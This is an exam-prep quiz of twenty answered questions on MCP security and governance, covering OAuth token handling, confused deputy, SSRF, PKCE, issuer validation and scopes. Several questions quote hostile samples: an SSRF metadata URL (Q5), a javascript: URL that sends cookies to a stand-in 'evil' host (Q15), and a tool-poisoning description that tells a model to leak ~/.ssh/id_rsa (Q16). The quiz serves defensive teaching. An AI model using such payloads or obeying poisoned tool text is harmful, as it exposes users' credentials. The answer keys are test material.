# Domain 4 Quiz — Security & Governance

20 exam-style questions. Target: **17/20**.

---

**1.** Which statement about MCP and security enforcement is correct?

- A. The protocol cryptographically enforces user consent for every tool call
- B. MCP cannot enforce its security principles at the protocol level; implementors must build consent and authorization flows
- C. Security is only relevant for stdio servers
- D. Servers are responsible for obtaining user consent before tools are invoked

??? success "Answer"
    **B.** The spec says MCP cannot enforce these principles itself. Consent is primarily the host's responsibility.

---

**2.** A remote MCP server receives a bearer token whose audience is a different API, and forwards it to that API. What is this called, and is it allowed?

- A. Token exchange; allowed
- B. Token passthrough; explicitly forbidden
- C. Step-up authorization; required
- D. Delegation; recommended

??? success "Answer"
    **B.** Servers MUST NOT accept tokens not issued for them, and MUST NOT pass through the client's token upstream.

---

**3.** Which condition is **NOT** part of the confused deputy scenario described in the Security Best Practices?

- A. The MCP proxy uses a static client ID with a third-party authorization server
- B. The proxy allows MCP clients to dynamically register
- C. The third-party authorization server sets a consent cookie
- D. The MCP client uses PKCE with S256

??? success "Answer"
    **D.** The vulnerable conditions are static client ID, dynamic registration, a consent cookie, and missing per-client consent in the
    proxy. PKCE is a required control, not part of the vulnerability.

---

**4.** What is the required mitigation for the confused deputy attack in MCP proxy servers?

- A. Disable PKCE
- B. Implement per-client consent, checked before initiating the third-party authorization flow
- C. Use longer-lived tokens
- D. Rely on the third-party consent cookie

??? success "Answer"
    **B.** Proxies MUST keep per-user registries of approved client IDs, show their own consent page, validate redirect URIs exactly, and
    handle `state` securely.

---

**5.** A malicious MCP server returns `WWW-Authenticate: Bearer resource_metadata="http://169.254.169.254/latest/meta-data/"`. What attack is this, and what should a server-deployed client do?

- A. Mix-up; validate `iss`
- B. SSRF; enforce HTTPS and block link-local and private address ranges before fetching
- C. DNS rebinding; validate Origin
- D. Token passthrough; reject the token

??? success "Answer"
    **B.** Clients fetching server-supplied OAuth URLs must guard against SSRF: HTTPS, block private and link-local ranges (including the
    cloud metadata address), validate redirects, consider an egress proxy.

---

**6.** Which is the correct order a client uses to find Protected Resource Metadata when there is no `resource_metadata` in the `WWW-Authenticate` header, for an endpoint at `https://example.com/public/mcp`?

- A. Root well-known URI, then path-specific well-known URI
- B. `https://example.com/.well-known/oauth-protected-resource/public/mcp`, then `https://example.com/.well-known/oauth-protected-resource`
- C. `https://example.com/public/mcp/.well-known/openid-configuration` only
- D. Ask the user for the URL

??? success "Answer"
    **B.** Clients MUST try the path-specific well-known URI first, then the root.

---

**7.** Authorization server metadata lacks `code_challenge_methods_supported`. What must the MCP client do?

- A. Proceed without PKCE
- B. Use the `plain` method
- C. Refuse to proceed
- D. Switch to Dynamic Client Registration

??? success "Answer"
    **C.** Clients MUST verify PKCE support from metadata and MUST refuse to proceed if the field is absent. They MUST use S256 when capable.

---

**8.** What is the purpose of the `resource` parameter (RFC 8707) in MCP authorization?

- A. To select a tool
- B. To bind the access token to a specific MCP server, so it can't be replayed at another service
- C. To request a refresh token
- D. To identify the client application

??? success "Answer"
    **B.** Clients MUST send it, set to the MCP server's canonical URI, in both authorization and token requests, regardless of AS support.

---

**9.** Which mitigation specifically defends against **mix-up attacks**?

- A. PKCE
- B. Resource indicators
- C. Validating the `iss` parameter in the authorization response against the recorded issuer
- D. Short-lived access tokens

??? success "Answer"
    **C.** RFC 9207 issuer identification. PKCE and resource indicators do not prevent mix-up.

---

**10.** Which client registration mechanism does the `2026-07-28` specification prefer when client and server have no prior relationship?

- A. Dynamic Client Registration
- B. Client ID Metadata Documents
- C. Hardcoded shared secrets
- D. Implicit flow

??? success "Answer"
    **B.** CIMD uses an HTTPS URL as the `client_id`. DCR is deprecated and retained for compatibility.

---

**11.** A client holding a `files:read` token attempts a write and receives `403` with `WWW-Authenticate: Bearer error="insufficient_scope", scope="files:write"`. Which scope set should the client request when re-authorizing?

- A. Only `files:write`
- B. The union of previously requested scopes and `files:write`
- C. Every scope in `scopes_supported` plus `offline_access`
- D. None; it should give up

??? success "Answer"
    **B.** Step-up: compute the union so previously granted permissions aren't lost, re-authorize, and retry a limited number of times.

---

**12.** Where must access tokens be sent to an MCP server over HTTP?

- A. In the URL query string
- B. In the `Authorization: Bearer` header on every request
- C. Only on the first request of a session
- D. In `_meta`

??? success "Answer"
    **B.** Tokens MUST NOT be in the query string, and authorization MUST be included on every HTTP request.

---

**13.** An MCP server issues sequential basket IDs (`bsk_1001`, `bsk_1002`) and loads any basket whose ID is passed in. What is the vulnerability and fix?

- A. SSRF; block private IPs
- B. State handle hijacking; use random handles and bind them server-side to the authenticated user from the verified token
- C. Mix-up; validate `iss`
- D. None; handles are protected by TLS

??? success "Answer"
    **B.** Possession of a handle MUST NOT be treated as authentication. Use non-deterministic handles and verify ownership on every request.

---

**14.** A client offers one-click installation of local MCP servers. Which is REQUIRED before executing the server command?

- A. Show a shortened command so the dialog fits
- B. Show the exact, untruncated command with arguments, identify it as potentially dangerous, and require explicit approval
- C. Run the command first, then ask for approval
- D. Nothing; local servers are trusted

??? success "Answer"
    **B.** Truncation can hide a malicious suffix. Sandboxing and dangerous-pattern warnings are additional SHOULDs.

---

**15.** An MCP client receives an authorization endpoint of `javascript:fetch('https://evil/'+document.cookie)`. What must it do?

- A. Open it in a new window
- B. Reject it; only http and https schemes are allowed for authorization URLs, and URLs must never be opened via a shell
- C. URL-encode it and open it
- D. Pass it to the model for evaluation

??? success "Answer"
    **B.** Clients MUST allow only http(s) (http for loopback in development), reject dangerous schemes, and MUST NOT use shell commands to open URLs.

---

**16.** A tool's description contains hidden text instructing the model to read `~/.ssh/id_rsa` and pass it in a parameter. What is this attack called, and which host control most directly exposes it at call time?

- A. Rug pull; version pinning
- B. Tool poisoning; showing the tool call's arguments to the user before calling the server
- C. Mix-up; `iss` validation
- D. DNS rebinding; Origin validation

??? success "Answer"
    **B.** The spec recommends clients show tool inputs before calling the server to catch exfiltration, and treat untrusted server metadata as untrusted.

---

**17.** Which identity value should an audit log use as the authoritative actor for a remote MCP request?

- A. `io.modelcontextprotocol/clientInfo.name`
- B. The `serverInfo` name
- C. Claims from the validated access token, such as `sub`
- D. A username the user typed into an elicitation form

??? success "Answer"
    **C.** `clientInfo` and `serverInfo` are self-reported. Servers must not rely on unverified user claims, and should derive identity from MCP authorization.

---

**18.** With the Logging feature deprecated, how should a stdio MCP server emit its logs?

- A. Write them to stdout
- B. Write them to stderr
- C. Send them as `notifications/message` on a `subscriptions/listen` stream
- D. Embed them in tool results

??? success "Answer"
    **B.** stdout is reserved for MCP messages. The migration path is stderr for stdio, OpenTelemetry for structured observability.

---

**19.** How is distributed trace context propagated across an MCP request in a transport-independent way?

- A. Only via HTTP `traceparent` headers
- B. Via `traceparent`, `tracestate` and `baggage` keys in `params._meta`
- C. Via `Mcp-Session-Id`
- D. Via `clientInfo`

??? success "Answer"
    **B.** These keys are reserved in `_meta` (unprefixed, W3C formats), and work on stdio too.

---

**20.** Which approach best follows scope minimization?

- A. Publish every scope in `scopes_supported` and request all of them up front
- B. Use a single `full-access` scope to avoid repeated prompts
- C. Start with a minimal baseline scope set and elevate incrementally via targeted `insufficient_scope` challenges
- D. Treat the scopes claimed in a token as sufficient without server-side checks

??? success "Answer"
    **C.** The progressive least-privilege model. A, B and D are listed as common mistakes.

---

| Score | Verdict |
| --- | --- |
| 18–20 | Strong. |
| 14–17 | Re-read [Authorization](authorization.md) and [Attacks & Mitigations](attacks-mitigations.md). |
| < 14 | Rework the domain. It is nearly a quarter of the exam. |
